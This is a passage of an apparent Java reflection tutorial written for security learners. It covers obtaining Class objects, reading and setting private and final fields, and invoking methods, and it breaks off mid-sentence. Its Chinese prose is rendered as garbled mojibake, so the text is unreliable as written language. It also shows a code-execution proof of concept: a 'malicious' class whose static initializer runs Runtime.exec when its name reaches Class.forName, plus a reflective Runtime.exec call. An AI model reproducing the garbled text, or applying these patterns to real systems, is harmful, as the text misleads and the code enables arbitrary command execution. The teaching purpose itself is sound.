ï¼šå°†å­—èŠ‚ç æ–‡ä»¶åŠ è½½è¿›å†…å­˜ï¼Œè¿”å›Classå¯¹è±¡ å¤šç”¨äºé…ç½®æ–‡ä»¶ï¼Œå°†ç±»åå®šä¹‰åœ¨é…ç½®æ–‡ä»¶ä¸­ã€‚è¯»å–æ–‡ä»¶ï¼ŒåŠ è½½ç±»ã€‚\nç±»å.class ï¼šé€šè¿‡ç±»åçš„å±æ€§classè·å– å¤šç”¨äºå‚æ•°çš„ä¼ é€’\nå¯¹è±¡.getClass() ï¼šgetClass()æ–¹æ³•å®šä¹‰äºObjectç±»ä¸­,å¹¶ä¸”éœ€è¦å…ˆå®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ã€‚è¿™é‡Œæœ‰ä¸€ä¸ªç‚¹è¦è¯´æ˜ã€‚å¦‚æœä¸æ˜¯ä¸€ä¸ªå®ä¾‹åŒ–å¯¹è±¡ï¼Œè€Œæ˜¯ä¸€ä¸ªclasså¯¹è±¡ï¼Œé‚£ä¹ˆéƒ½ä¼šè¿”å›class java.lang.Classï¼ŒåŒæ ·çš„ï¼Œå¦‚æœæ˜¯ä¸€ä¸ªæ–¹æ³•çš„classå¯¹è±¡ï¼Œé‚£ä¹ˆè¿”å›çš„ä¼šæ˜¯class java.lang.reflect.Methodï¼Œæ³¨æ„åŒºåˆ†è¾¨åˆ«ã€‚ classloader.loadClass()ï¼šè¿™æ˜¯é€šè¿‡ç±»åŠ è½½å™¨æ¥åŠ è½½ç±»ï¼Œè¿™ä¸ªæ¿å—ä¸è¯´ï¼Œåé¢åˆ°ç±»åŠ è½½å™¨å†äº†è§£ã€‚ å¤šç”¨äºå¯¹è±¡çš„è·å–å­—èŠ‚ç çš„æ–¹å¼\n\u0026mdash;-â€”â€”â€”â€”\nç»™ä¸€ä¸ªä»£ç æ¥æ¼”ç¤ºä¸€ä¸‹è·å–Classå¯¹è±¡çš„ä¸‰ç§æ–¹å¼ï¼š\nç›®å½•ç»“æ„ä¸ºï¼š\ndemoï¼šReflection.java 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 package java_foundation; public class Reflection { private String name; protected String sex; public int age = 222; public int getAge(){ return this.age; } public void setName(String name){ this.name=name; } public String getName(){ return this.name; } } æ‰§è¡Œä»£ç æ•ˆæœï¼šMain.javaï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 package java_foundation; import java.lang.Class; public class Main { public static void main(String[] args) throws Exception{ //æ–¹æ³•ä¸€ï¼š Class clazz = Class.forName(\u0026#34;java_foundation.Reflection\u0026#34;); Reflection reflection = (Reflection)clazz.newInstance();//å®ä¾‹åŒ–å¯¹è±¡ reflection.setName(\u0026#34;fupanc\u0026#34;); System.out.println(reflection.getName()); //æ–¹æ³•äºŒ Class clazz1 = Reflection.class; Reflection reflection1 = (Reflection)clazz1.newInstance(); reflection1.setName(\u0026#34;fupanc1\u0026#34;); System.out.println(reflection1.getName()); //æ–¹æ³•ä¸‰ Reflection reflection2 = new Reflection(); Class clazz2 = reflection2.getClass(); Reflection reflection3 = (Reflection)clazz2.newInstance(); System.out.println(reflection3.getAge()); //å…¶ä»–è¯´æ˜ Class reflection5 = Reflection.class; System.out.println(reflection5.getClass()); System.out.println(reflection5.getName()); } } è¾“å‡ºä¸ºï¼š\n1 2 3 4 5 fupanc fupanc1 222 class java.lang.Class java_foundation.Reflection å¯ä»¥æ¸…æ¥šæ˜ç™½åœ°çœ‹å‡ºè¿™é‡Œçš„å·®åˆ«ï¼Œé‡è¦çš„æ˜¯ï¼Œå­¦ä¹ javaä¸€å®šè¦æœ‰å¯¹è±¡çš„æ¦‚å¿µã€‚\néœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨è·å–classå¯¹è±¡ä¸­ï¼Œä¸€èˆ¬ä½¿ç”¨Class.forNameæ–¹æ³•å»è·å–ï¼Œå…¶ä»–ä¸¤ä¸ªéƒ½æœ‰ä¸€å®šçš„é™åˆ¶ã€‚\nå¦å¤–çš„ä¸€ä¸ªç‚¹éœ€è¦è¯´æ˜\nforNameæœ‰ä¸¤ä¸ªå‡½æ•°é‡è½½ï¼š\nClass\u0026lt;?\u0026gt; forName(String name)\nClass\u0026lt;?\u0026gt; forName(String name, **boolean** initialize, ClassLoader loader)\nç¬¬â¼€ä¸ªå°±æ˜¯æˆ‘ä»¬æœ€å¸¸â»…çš„è·å–classçš„â½…å¼ï¼Œå…¶å®å¯ä»¥ç†è§£ä¸ºç¬¬â¼†ç§â½…å¼çš„â¼€ä¸ªå°è£…ï¼š\n1 2 3 Class.forName(className) // ç­‰äº Class.forName(className, true, currentLoader) é»˜è®¤æƒ…å†µä¸‹ï¼Œ forName çš„ç¬¬â¼€ä¸ªå‚æ•°æ˜¯ç±»åï¼›ç¬¬â¼†ä¸ªå‚æ•°è¡¨ç¤ºæ˜¯å¦åˆå§‹åŒ–ï¼›ç¬¬ä¸‰ä¸ªå‚æ•°å°±æ˜¯ ClassLoader ã€‚\nå¯¹äºç¬¬äºŒä¸ªå‚æ•°ï¼Œå¯ä»¥å°†å…¶ç†è§£ä¸ºå¯¹ä¸€ä¸ªç±»çš„åˆå§‹åŒ–ï¼Œæ„é€ å‡½æ•°å¹¶ä¸ä¼šæ‰§è¡Œï¼Œçœ‹å¦‚ä¸‹ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 package java_foundation; import java.lang.Class; public class Main { public static void main(String[] args) throws Exception{ Class clazz = Class.forName(\u0026#34;java_foundation.Test\u0026#34;); } } class Test{ { System.out.println(\u0026#34;ç›´æ¥è°ƒç”¨çš„{}\u0026#34;); } static{ System.out.println(\u0026#34;ç›´æ¥è°ƒç”¨çš„static\u0026#34;); } public Test(){ System.out.println(\u0026#34;è°ƒç”¨äº†ç±»çš„æ„é€ å‡½æ•°\u0026#34;); } } è¾“å‡ºç»“æœä¸ºï¼š\n1 ç›´æ¥è°ƒç”¨çš„static è¿™æ ·å°±å¯ä»¥å¾ˆå®¹æ˜“åœ°çœ‹å‡ºâ€œç±»çš„åˆå§‹åŒ–\u0026quot;è°ƒç”¨çš„æ˜¯static {}ï¼Œç„¶åå½“æˆ‘å°è¯•Test test = new Test();è¿™æ ·æ˜¾å¼åœ°åˆå§‹åŒ–æ—¶ï¼Œå¯ä»¥å‘ç°è°ƒç”¨é¡ºåºæ˜¯ï¼šstatic{} ==ã€‹{} ==ã€‹æ„é€ å‡½æ•°ã€‚\nå¯ä»¥å»¶ä¼¸ä¸€ä¸‹ï¼Œå‡è®¾æˆ‘ä»¬æœ‰å¦‚ä¸‹å‡½æ•°ï¼Œå…¶ä¸­å‡½æ•°çš„å‚æ•°nameå¯æ§ï¼š\n1 2 3 4 5 6 7 8 9 10 package java_foundation; import java.lang.Class; public class Main { public static void main(String[] args) throws Exception{ String name =\u0026#34;java_foundation.MyTest\u0026#34;; Class clazz = Class.forName(name); } } æˆ‘ä»¬å°±å¯ä»¥ç¼–å†™â¼€ä¸ªæ¶æ„ç±»ï¼Œå°†æ¶æ„ä»£ç æ”¾ç½®åœ¨ static {} ä¸­ï¼Œä»â½½æ‰§â¾ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 package java_foundation; import java.lang.Runtime; import java.lang.Process; public class MyTest { static{ try{ Runtime runtime = Runtime.getRuntime(); String[] commands = {\u0026#34;calc\u0026#34;}; Process pc = runtime.exec(commands); pc.waitFor(); }catch(Exception e){ } } } è¿™æ ·æ˜¯å¯ä»¥æˆåŠŸå¼¹è®¡ç®—æœºçš„ï¼Œå½“ç„¶è°ƒç”¨ä¸ä¸€å®šæ˜¯åœ¨mainä¸»æ–¹æ³•ä¸­ï¼Œè¿˜å¯ä»¥æ˜¯å…¶ä»–æ–¹æ³•å†…éƒ¨è°ƒç”¨ã€‚\nè·å–æˆå‘˜å˜é‡Field è·å–æˆå‘˜å˜é‡Fieldï¼Œä½äºjava.lang.reflect.Fieldä¸­ï¼Œå¸¸ä½¿ç”¨çš„æ–¹æ³•æœ‰å¦‚ä¸‹å‡ ç§\nField[] getFields()ï¼šè·å–æ‰€æœ‰publicä¿®é¥°çš„æˆå‘˜å˜é‡ï¼ˆåŒ…æ‹¬çˆ¶ç±»ï¼‰ Field[] getDeclaredFields()ï¼šè·å–æ‰€æœ‰çš„æˆå‘˜å˜é‡ï¼Œä¸è€ƒè™‘ä¿®é¥°ç¬¦ï¼ˆä¸åŒ…æ‹¬çˆ¶ç±»ï¼‰ Field getField(String name)ï¼šè·å–æŒ‡å®šåç§°çš„publicä¿®é¥°çš„æˆå‘˜å˜é‡ï¼ˆåŒ…æ‹¬çˆ¶ç±»ï¼‰ Field getDeclaredField(String name)ï¼šè·å–æŒ‡å®šçš„æˆå‘˜å˜é‡ï¼ˆä¸åŒ…æ‹¬çˆ¶ç±»ï¼‰ è·å–å­—æ®µ è¿˜æ˜¯åˆ©ç”¨ä¹‹å‰é‚£ä¸ªdemoæ¥æ¼”ç¤ºä¸€ä¸‹\nReflection.javaï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 package java_foundation; public class Reflection { private String name; protected String sex; public int age = 222; public int getAge(){ return this.age; } public void setName(String name){ this.name=name; } public String getName(){ return this.name; } } Main.javaï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 package java_foundation; import java.lang.Class; import java.lang.reflect.Field; public class Main { public static void main(String[] args) throws Exception{ String name =\u0026#34;java_foundation.Reflection\u0026#34;; Class clazz = Class.forName(name); Field[] field = clazz.getDeclaredFields(); for(Field x : field){ System.out.println(x); } System.out.println(\u0026#34;==============\u0026#34;); Field field1 = clazz.getDeclaredField(\u0026#34;sex\u0026#34;); System.out.println(field1); System.out.println(field1.getName()); System.out.println(field1.getType()); System.out.println(\u0026#34;==============\u0026#34;); Field field2 = clazz.getDeclaredField(\u0026#34;age\u0026#34;); System.out.println(field2); System.out.println(field2.getName()); System.out.println(field2.getType()); } } //å¯¹äºæ•°ç»„ç±»å‹çš„éœ€è¦ä½¿ç”¨forå¾ªç¯æ¥ä¾¿åˆ©è¾“å‡º è¾“å‡ºä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 private java.lang.String java_foundation.Reflection.name protected java.lang.String java_foundation.Reflection.sex public int java_foundation.Reflection.age ============== protected java.lang.String java_foundation.Reflection.sex sex class java.lang.String ============== public int java_foundation.Reflection.age age int æˆ‘ä»¬è¿˜éœ€è¦äº†è§£çš„æ˜¯ä¸€ä¸ªFieldå¯¹è±¡åŒ…å«äº†ä¸€ä¸ªå­—æ®µçš„æ‰€æœ‰ä¿¡æ¯ï¼Œå¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‡½æ•°è·å–\ngetName()ï¼šè¿”å›å­—æ®µåç§° getType()ï¼šè¿”å›å­—æ®µç±»å‹ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªClasså®ä¾‹ getModifiers()ï¼šè¿”å›å­—æ®µä¿®é¥°ç¬¦ get(obj)ï¼šè·å–å­—æ®µå€¼ setï¼šä¿®æ”¹å­—æ®µå€¼ è¿™æ—¶å†çœ‹ä¸Šé¢ç»™çš„ä»£ç ï¼Œå°±å¯ä»¥çŸ¥é“ä¸ä½¿ç”¨getName()ç›´æ¥è¾“å‡ºå°±å¯ä»¥è·å–åˆ°å˜é‡çš„ä¿®é¥°ç¬¦ä»¥åŠç±»å‹ã€‚\nè·å–å­—æ®µå€¼ è¿™é‡Œå°±éœ€è¦ç”¨åˆ°get(obj)ï¼Œç›´æ¥çœ‹ä»£ç ã€‚\nè¿™é‡Œå°†Reflection.javaç¨å¾®æ”¹æ”¹\n1 2 3 4 5 6 7 package java_foundation; public class Reflection { private String name = \u0026#34;fupanc\u0026#34;; protected String sex = \u0026#34;boy\u0026#34;; public int age = 222; } Main.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 package java_foundation; import java.lang.Class; import java.lang.reflect.Field; public class Main { public static void main(String[] args) throws Exception{ String name =\u0026#34;java_foundation.Reflection\u0026#34;; Class clazz = Class.forName(name); System.out.println(\u0026#34;==============\u0026#34;); Field field1 = clazz.getDeclaredField(\u0026#34;sex\u0026#34;); System.out.println(field1.get(clazz.newInstance())); System.out.println(\u0026#34;==============\u0026#34;); Field field2 = clazz.getDeclaredField(\u0026#34;age\u0026#34;); System.out.println(field2.get(clazz.newInstance())); System.out.println(\u0026#34;==============\u0026#34;); Field field3 = clazz.getDeclaredField(\u0026#34;name\u0026#34;); System.out.println(field3.get(clazz.newInstance())); } } è¾“å‡ºä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 ============== boy ============== 222 ============== Exception in thread \u0026#34;main\u0026#34; java.lang.IllegalAccessException: Class java_foundation.Main can not access a member of class java_foundation.Reflection with modifiers \u0026#34;private\u0026#34; at sun.reflect.Reflection.ensureMemberAccess(Reflection.java:102) at java.lang.reflect.AccessibleObject.slowCheckMemberAccess(AccessibleObject.java:296) at java.lang.reflect.AccessibleObject.checkAccess(AccessibleObject.java:288) at java.lang.reflect.Field.get(Field.java:390) at java_foundation.Main.main(Main.java:19) è¿™é‡Œå¯ä»¥çœ‹åˆ°privateå­—æ®µæŠ›å‡ºé”™è¯¯ï¼Œå¯ä»¥è°ƒç”¨Field.setAccessible(true)ï¼Œæ›´æ”¹ä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 package java_foundation; import java.lang.Class; import java.lang.reflect.Field; public class Main { public static void main(String[] args) throws Exception{ String name =\u0026#34;java_foundation.Reflection\u0026#34;; Class clazz = Class.forName(name); System.out.println(\u0026#34;==============\u0026#34;); Field field1 = clazz.getDeclaredField(\u0026#34;sex\u0026#34;); System.out.println(field1.get(clazz.newInstance())); System.out.println(\u0026#34;==============\u0026#34;); Field field2 = clazz.getDeclaredField(\u0026#34;age\u0026#34;); System.out.println(field2.get(clazz.newInstance())); System.out.println(\u0026#34;==============\u0026#34;); Field field3 = clazz.getDeclaredField(\u0026#34;name\u0026#34;); field3.setAccessible(true); System.out.println(field3.get(clazz.newInstance())); } } /* ============== boy ============== 222 ============== fupanc */ ä¿®æ”¹å­—æ®µå€¼ åŸºæœ¬æ ¼å¼ï¼š\n1 2 Field f = stdClass.getDeclaredField(\u0026#34;grade\u0026#34;); f.set(obj, \u0026#34;xxxx\u0026#34;); è¿™æ ·åŸºæœ¬å°±æ‡‚äº†ï¼Œè¿™é‡Œçš„objå°±æ˜¯ä¸€ä¸ªå®ä¾‹ï¼Œéœ€è¦æ³¨æ„ï¼šå¯¹äºprivateä¿®é¥°çš„å­—æ®µä¿®æ”¹æ–¹æ³•ï¼ŒåŒæ ·éœ€è¦è°ƒç”¨Field.setAccessible(true)æ¥ä½¿å…¶å¯è®¿é—®ã€‚æµ‹è¯•ä»£ç å¦‚ä¸‹ï¼š Main.javaï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 package java_foundation; import java.lang.Class; import java.lang.reflect.Field; public class Main { public static void main(String[] args) throws Exception{ String name =\u0026#34;java_foundation.Reflection\u0026#34;; Class clazz = Class.forName(name); Object o = clazz.newInstance();//å®ä¾‹åŒ–å¯¹è±¡ System.out.println(\u0026#34;==============\u0026#34;); Field field1 = clazz.getDeclaredField(\u0026#34;sex\u0026#34;); System.out.println(field1.get(o)); System.out.println(\u0026#34;ä¿®æ”¹åçš„å†…å®¹ï¼š\u0026#34;); field1.set(o,\u0026#34;girl\u0026#34;); System.out.println(field1.get(o)); System.out.println(\u0026#34;==============\u0026#34;); Field field2 = clazz.getDeclaredField(\u0026#34;age\u0026#34;); System.out.println(field2.get(o)); System.out.println(\u0026#34;ä¿®æ”¹åçš„å†…å®¹ï¼š\u0026#34;); field2.set(o,1111); System.out.println(field2.get(o)); System.out.println(\u0026#34;==============\u0026#34;); Field field3 = clazz.getDeclaredField(\u0026#34;name\u0026#34;); field3.setAccessible(true);//æ³¨æ„åå°„è¿˜æ˜¯éœ€è¦è°ƒç”¨è¿™ä¸ª System.out.println(field3.get(o)); System.out.println(\u0026#34;ä¿®æ”¹åçš„å†…å®¹ï¼š\u0026#34;); field3.set(o,\u0026#34;hahaha\u0026#34;); System.out.println(field3.get(o)); } } è¾“å‡ºä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 ============== boy ä¿®æ”¹åçš„å†…å®¹ï¼š girl ============== 222 ä¿®æ”¹åçš„å†…å®¹ï¼š 1111 ============== fupanc ä¿®æ”¹åçš„å†…å®¹ï¼š hahaha æ³¨æ„çœ‹ä»£ç ï¼Œè¿™é‡Œä¸ºä»€ä¹ˆè¦å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡èµ‹å€¼ç»™ä¸€ä¸ªå˜é‡ï¼Œè€Œä¸æ˜¯åƒä¸Šé¢è·å–å­—æ®µå€¼é‚£æ ·ç›´æ¥ç”¨ctf.newInstance()ç›´æ¥æ¥ä»£è¡¨objï¼Œå¯ä»¥å…ˆè‡ªå·±æƒ³æƒ³ğŸ˜ˆï¼Œç°åœ¨ç»™å‡ºè§£é‡Šï¼š\né‡ç‚¹å…¶å®è¿˜æ˜¯ç†è§£ä»£ç ï¼Œè¿™é‡Œè°ƒç”¨äº†ä¸¤æ¬¡oï¼Œä¹Ÿå°±æ˜¯è°ƒç”¨äº†ä¸¤æ¬¡å¯¹è±¡ã€‚å¦‚æœæˆ‘ä»¬ä¸¤ä¸ªåœ°æ–¹éƒ½ä½¿ç”¨ctf.newInstance()ï¼Œé‚£ä¹ˆå°±ä¼šå®ä¾‹åŒ–ä¸¤æ¬¡ï¼Œä¹Ÿå°±æ˜¯ä¼šè®©å‰é¢è¾“å‡ºå’Œåé¢ä¿®æ”¹çš„å¯¹è±¡æ˜¯ä¸ä¸€è‡´çš„ã€‚æ‰€ä»¥éœ€è¦ä½¿ç”¨ä¸€ä¸ªoæ¥ä»£è¡¨è¿™æ˜¯åŒä¸€ä¸ªå¯¹è±¡ï¼Œä»è€Œè¾“å‡ºä¿®æ”¹åçš„ç»“æœã€‚ä¸è¦å°çœ‹è¿™ä¸€ä¸ªå°å°çš„é—®é¢˜å“¦\nä¿®æ”¹finalå…³é”®å­—ä¿®é¥°çš„æˆå‘˜å˜é‡ è¿™é‡Œå•ç‹¬æ‹¿å‡ºæ¥è¯´æ˜¯å› ä¸ºfinalå…³é”®å­—ä¿®é¥°çš„ç‰¹æ€§ï¼Œè¢«finalå…³é”®å­—ä¿®é¥°çš„å˜é‡è¡¨æ˜å…¶æ•°å€¼åœ¨åˆå§‹åŒ–ä¹‹åå°±ä¸èƒ½å†æ›´æ”¹ï¼Œå¹¶ä¸”éœ€è¦åœ¨å®šä¹‰è¿™ä¸ªå­—æ®µæ—¶å°±å£°æ˜å€¼ï¼Œå¹¶ä¸”æ˜¯ä¸èƒ½é€šè¿‡è®¾ç½®setteræ–¹æ³•æ¥ä¿®æ”¹ï¼Œå¦‚ä¸‹ä»£ç è¯´æ˜ï¼š\n1 2 3 4 5 6 class Something{ private final String name = \u0026#34;fupanc\u0026#34;; public void setName(String name){ this.name = name; } } æ­¤æ—¶å°±ä¼šæŠ¥é”™ï¼š æ— æ³•å°†å€¼èµ‹ç»™ final å˜é‡ \u0026rsquo;name\u0026rsquo;ã€‚\nç„¶åæŒ‰ç…§æˆ‘çš„ç†è§£ï¼Œå…¶å®å‰é¢çš„set()å’Œget()æ–¹æ³•å…¶æœ¬è´¨å°±æ˜¯setterå’Œgetteræ–¹æ³•ã€‚æ‰€ä»¥è¿™é‡Œè¯¥æ€ä¹ˆä¿®æ”¹å‘¢ï¼Ÿ\næŒ‰ç…§ä¸‹é¢å¥—å°±è¡Œï¼Œæ³¨æ„éœ€è¦å¯¼å…¥java.lang.reflect.Modifierï¼š\n1 2 3 4 5 6 7 8 9 10 11 // åå°„è·å–Fieldç±»çš„modifiers Field modifiers = field.getClass().getDeclaredField(\u0026#34;modifiers\u0026#34;); // è®¾ç½®modifiersä¿®æ”¹æƒé™ modifiers.setAccessible(true); // ä¿®æ”¹æˆå‘˜å˜é‡çš„Fieldå¯¹è±¡çš„modifierså€¼ï¼ˆåƒæ˜¯ç§»é™¤finalä¿®é¥°ç¬¦ï¼‰ modifiers.setInt(field, field.getModifiers() \u0026amp; ~Modifier.FINAL); // ä¿®æ”¹æˆå‘˜å˜é‡å€¼ field.set(ç±»å®ä¾‹å¯¹è±¡, ä¿®æ”¹åçš„å€¼); å®ä¾‹ä½¿ç”¨å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 package java_foundation; import java.lang.reflect.Modifier; import java.lang.reflect.Field; public class Text { public static void main(String[] args) throws Exception { Something o = new Something(); Class clazz = Class.forName(\u0026#34;java_foundation.Something\u0026#34;); Field field = clazz.getDeclaredField(\u0026#34;name\u0026#34;); field.setAccessible(true); System.out.println(field.get(o)); Field modifiers = field.getClass().getDeclaredField(\u0026#34;modifiers\u0026#34;); modifiers.setAccessible(true); modifiers.setInt(field,field.getModifiers() \u0026amp; ~Modifier.FINAL); field.set(o,\u0026#34;hahaha\u0026#34;); System.out.println(field.get(o)); } } class Something{ private final String name = \u0026#34;fupanc\u0026#34;; public String getName(){ return this.name; } } /* fupanc hahaha */ è¿™æ ·å°±å¯ä»¥ä¿®æ”¹Userç±»ä¸­çš„privateå’Œfinalå±æ€§çš„nameå€¼\nè·å–ç±»çš„æ–¹æ³• æƒ³è¦åˆ›å»ºMethodéœ€è¦å¯¼åŒ…ï¼Œä½äºjava.lang.reflect.Methodä¸‹ï¼Œå¸¸ä½¿ç”¨çš„æ–¹æ³•å¦‚ä¸‹ï¼š\n1 2 3 4 5 Method getMethod(name,Class...)ï¼šè·å–æŸä¸ªpublicçš„Methodï¼ˆåŒ…æ‹¬çˆ¶ç±»ï¼‰ Method getDeclaredMethod(name,Class...)ï¼šè·å–å½“å‰ç±»çš„æŸä¸ªMethodï¼ˆä¸åŒ…æ‹¬çˆ¶ç±»ï¼‰ //ç¬¬ä¸€ä¸ªå‚æ•°è·å–è¯¥æ–¹æ³•çš„åå­—ï¼Œç¬¬äºŒä¸ªå‚æ•°è·å–æ ‡è¯†è¯¥æ–¹æ³•çš„å‚æ•°ç±»å‹ Method[] getMethods()ï¼šè·å–æ‰€æœ‰publicçš„Methodï¼ˆåŒ…æ‹¬çˆ¶ç±»ï¼‰ Method[] getDeclaredMethods()ï¼šè·å–å½“å‰ç±»çš„æ‰€æœ‰Methodï¼ˆä¸åŒ…æ‹¬çˆ¶ç±»ï¼‰ åŒæ ·çš„ä¸€ä¸ªMethodå¯¹è±¡åŒ…å«ä¸€ä¸ªæ–¹æ³•çš„æ‰€æœ‰ä¿¡æ¯ï¼š\ngetName()ï¼šè¿”å›æ–¹æ³•åç§° getReturnType()ï¼šè¿”å›æ–¹æ³•è¿”å›å€¼ç±»å‹ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªClasså®ä¾‹ getParameterTypes()ï¼šè¿”å›æ–¹æ³•çš„å‚æ•°ç±»å‹ï¼Œæ˜¯ä¸€ä¸ªClassæ•°ç»„ getModifiers()ï¼šè¿”å›æ–¹æ³•çš„ä¿®é¥°ç¬¦ è·å–æ–¹æ³• ç›´æ¥ç»™ä»£ç çœ‹å¦‚ä½•åˆ©ç”¨,ä¸ºäº†å‡¸æ˜¾ç»“æœæ–¹ä¾¿ç†è§£ï¼Œè¿™é‡Œæ”¹ä¸€ä¸‹Reflection.javaçš„ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 package java_foundation; public class Reflection { private String name = \u0026#34;fupanc\u0026#34;; protected String sex = \u0026#34;boy\u0026#34;; public int age = 222; public int getAge(){ return this.age; } private void setAge(int age){ this.age = age; } protected void setName(String name){ this.name=name; } public String getName(){ return this.name; } } Main.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 package java_foundation; import java.lang.Class; import java.lang.reflect.Method; public class Main { public static void main(String[] args) throws Exception{ String name =\u0026#34;java_foundation.Reflection\u0026#34;; Class clazz = Class.forName(name); Method[] method = clazz.getDeclaredMethods(); for(Method x:method){ System.out.println(x); } System.out.println(\u0026#34;==============\u0026#34;); Method method1 = clazz.getDeclaredMethod(\u0026#34;setAge\u0026#34;,int.class); System.out.println(method1.getName()); System.out.println(method1.getReturnType()); } } è¾“å‡ºä¸ºï¼š\n1 2 3 4 5 6 7 public java.lang.String java_foundation.Reflection.getName() protected void java_foundation.Reflection.setName(java.lang.String) private void java_foundation.Reflection.setAge(int) public int java_foundation.Reflection.getAge() ============== setAge void è¿™é‡Œéœ€è¦æ³¨æ„çš„å°±æ˜¯å¯¹äºä¸åŒä¿®é¥°ç¬¦ä¿®é¥°çš„æ–¹æ³•åœ¨è·å–æ—¶ä½¿ç”¨çš„æ–¹æ³•çš„ä¸åŒï¼Œä½†å…¶å®ä¸€èˆ¬éƒ½æ˜¯ä½¿ç”¨çš„Declaredé‚£ç±»æ–¹æ³•ã€‚\nè°ƒç”¨æ–¹æ³• invoke()ï¼šè°ƒç”¨æ–¹æ³•ã€‚\ninvokeçš„ä½œç”¨æ˜¯æ‰§è¡Œæ–¹æ³•ï¼Œéœ€è¦ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ï¼š\nå¦‚æœè¿™ä¸ªæ–¹æ³•æ˜¯ä¸€ä¸ªæ™®é€šæ–¹æ³•ï¼Œé‚£ä¹ˆç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç±»å¯¹è±¡ å¦‚æœè¿™ä¸ªæ–¹æ³•æ˜¯ä¸€ä¸ªé™æ€æ–¹æ³•ï¼Œé‚£ä¹ˆç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç±» ç¬¬äºŒä¸ªå‚æ•°æ˜¯è¿™ä¸ªæ–¹æ³•çš„éœ€è¦ä¼ å…¥çš„å‚æ•°ã€‚\nè¿™é‡Œéœ€è¦æ³¨æ„ä¸€ç‚¹ï¼Œåœ¨è°ƒç”¨æ–¹æ³•è¿™é‡Œä¸è·å–æˆå‘˜å˜é‡å·®ä¸å¤šï¼Œprivateä¿®é¥°ç¬¦ï¼Œéœ€è¦é€šè¿‡Method.setAccessible(true)å…è®¸å…¶è°ƒç”¨ã€‚\nå…ˆç®€å•ç»™ä»£ç çœ‹çœ‹\nReflection.javaï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 package java_foundation; public class Reflection { private String name = \u0026#34;fupanc\u0026#34;; protected String sex = \u0026#34;boy\u0026#34;; public int age = 222; public int getAge(){ return this.age; } private void setAge(int age){ this.age = age; } protected void setName(String name){ this.name=name; } public String getName(){ return this.name; } } Main.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 package java_foundation; import java.lang.Class; import java.lang.reflect.Method; public class Main { public static void main(String[] args) throws Exception{ String name =\u0026#34;java_foundation.Reflection\u0026#34;; Class clazz = Class.forName(name); Object o = clazz.newInstance(); Method method1 = clazz.getDeclaredMethod(\u0026#34;setAge\u0026#34;,int.class); method1.setAccessible(true); //éœ€è¦å…è®¸è®¿é—® method1.invoke(o,123); Method method2 = clazz.getDeclaredMethod(\u0026#34;getAge\u0026#34;); System.out.println(method2.invoke(o)); Method method3 = clazz.getDeclaredMethod(\u0026#34;setName\u0026#34;,String.class); method3.invoke(o,\u0026#34;hahaha\u0026#34;); Method method4 = clazz.getDeclaredMethod(\u0026#34;getName\u0026#34;); System.out.println(method4.invoke(o)); } } /* 123 hahaha */ å¯ä»¥çœ‹å‡ºæˆåŠŸè°ƒç”¨äº†setName/setAgeæ–¹æ³•å¹¶è®¾ç½®äº†name/ageçš„å€¼ï¼Œå¯ä»¥è‡ªå·±å†è°ƒè¯•ä¸€ä¸‹ï¼Œè¿™é‡Œåªæœ‰privateä¿®é¥°çš„æ–¹æ³•æ‰éœ€è¦è°ƒç”¨setAccessible(true)ï¼Œæ³¨æ„çœ‹ä»£ç ä¹‹é—´çš„è”ç³»ã€‚\nç¨å¾®è¯´æ˜ä¸€ä¸‹é™æ€æ–¹æ³•çš„åˆ©ç”¨æ–¹å¼ï¼Œå¦‚ä¸‹æ ¼å¼ï¼š\n1 2 3 4 5 6 7 8 Method f = Runtime.class.getMethod(\u0026#34;getRuntime\u0026#34;); Runtime r = (Runtime) f.invoke(Runtime.class); r.exec(\u0026#34;calc\u0026#34;); åŒæ ·çš„å¯ä»¥ä½¿ç”¨ Method f = Runtime.class.getMethod(\u0026#34;getRuntime\u0026#34;); Runtime r = (Runtime) f.invoke(null); r.exec(\u0026#34;calc\u0026#34;); //getRuntime()æ–¹æ³•æ˜¯é™æ€æ–¹æ³•ï¼Œè¿™æ ·å°±å¯ä»¥ç›´æ¥æ‰§è¡Œæ–¹æ³•ä»è€Œè·å–Runtimeç±»çš„å®ä¾‹åŒ–å¯¹è±¡ è¿™æ˜¯åå°„APIçŸ¥é“é™æ€æ–¹æ³•ä¸éœ€è¦å®ä¾‹å¯¹è±¡ï¼Œå› 